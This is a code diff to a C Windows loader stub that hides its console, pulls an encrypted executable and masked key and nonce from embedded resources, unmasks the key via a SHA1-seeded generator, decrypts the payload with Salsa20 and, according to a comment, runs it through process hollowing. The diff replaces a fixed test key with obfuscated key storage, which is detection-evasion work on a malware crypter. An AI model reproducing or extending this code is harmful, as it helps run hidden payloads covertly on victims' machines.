@@ -1,7 +1,8 @@
-#include <windows.h>
-#include <stdint.h>
 #include <stdio.h>
+#include <stdint.h>
+#include <windows.h>
 #include "salsa20.h"
+#include "SHA1.h"
 
 // Function to extract embedded resource from this executable
 unsigned char *GetResource(int resourceId, char* resourceType, unsigned long* dwSize)
@@ -28,43 +29,58 @@ int main()
 {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-    // Extract the encrypted PE from our resources
-    unsigned long dwSize;
-    unsigned char* resourcePtr = GetResource(132, RT_RCDATA, &dwSize);
+    //stub, if no key or/and nonce found 
+    unsigned char key[32] = {0}; 
+    unsigned char nonce[8] = {0}; 
 
-    if (resourcePtr == NULL || dwSize == 0)
+    // Extract the encrypted PE from our resources
+    unsigned long payloadSize, keySize, nonceSize;
+    unsigned char* payloadResPtr = GetResource(132, RT_RCDATA, &payloadSize);
+    unsigned char* hashedKeyResPtr = GetResource(133, RT_RCDATA, &keySize);
+    unsigned char* hashedNonceResPtr = GetResource(134, RT_RCDATA, &nonceSize);
+
+    if (payloadResPtr == NULL || payloadSize == 0)
     {
         // No encrypted payload found
         return 1;
     }
 
-    // Decrypt the embedded PE using the same key/nonce as builder (it is for testing)
-    uint8_t key[32] = 
-    {
-        0x00, 0x01, 0x02, 0x03,   0x04, 0x05, 0x06, 0x07,
-        0x08, 0x09, 0x0A, 0x0B,   0x0C, 0x0D, 0x0E, 0x0F,
-        0x10, 0x11, 0x12, 0x13,   0x14, 0x15, 0x16, 0x17,
-        0x18, 0x19, 0x1A, 0x1B,   0x1C, 0x1D, 0x1E, 0x1F
-    };
-
-    uint8_t nonce[8] = 
-    {
-        0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x11, 0x22
-    };
-
     uint32_t counter = 0;
     
+    unsigned char *data = (unsigned char*)payloadResPtr;
+    unsigned char hash[SHA1_BLOCK_SIZE];
+    SHA1(data, payloadSize, hash);
+
+    unsigned long state = (unsigned long)hash[0] 
+    | ((unsigned long)hash[1] << 8) 
+    | ((unsigned long)hash[2] << 16) 
+    | ((unsigned long)hash[3] << 24);
+
+    //generate value
+    unsigned long LCG_Result = lcg_rand(&state);
+
+    for (int i = 0; i < 32; i++)
+        key[i] = hashedKeyResPtr[i] ^ ((LCG_Result >> ((i % 4) * 8)) & 0xFF);
+    for (int i = 0; i < 8; i++)
+        nonce[i] = hashedNonceResPtr[i] ^ ((LCG_Result >> ((i % 4) * 8)) & 0xFF);
+
+
     // Allocate memory for decrypted PE
-    uint8_t* decrypted = (uint8_t*)VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    uint8_t* decrypted = (uint8_t*)VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (decrypted == NULL)
     {
         return 1;
     }
 
     // Copy encrypted data and decrypt it in place
-    memcpy(decrypted, resourcePtr, dwSize);
-    salsa20_crypt(decrypted, (uint32_t)dwSize, key, nonce, counter);
+    memcpy(decrypted, payloadResPtr, payloadSize);
+    salsa20_crypt(decrypted, (uint32_t)payloadSize, key, nonce, counter);
 
+    for (int i = 0; i < 32; i++)
+        key[i] ^= ((LCG_Result >> ((i % 4) * 8)) & 0xFF);
+    for (int i = 0; i < 8; i++)
+        nonce[i] ^= ((LCG_Result >> ((i % 4) * 8)) & 0xFF);
+        
     // Perform process hollowing to execute the decrypted PE
     void* pe = decrypted;
 
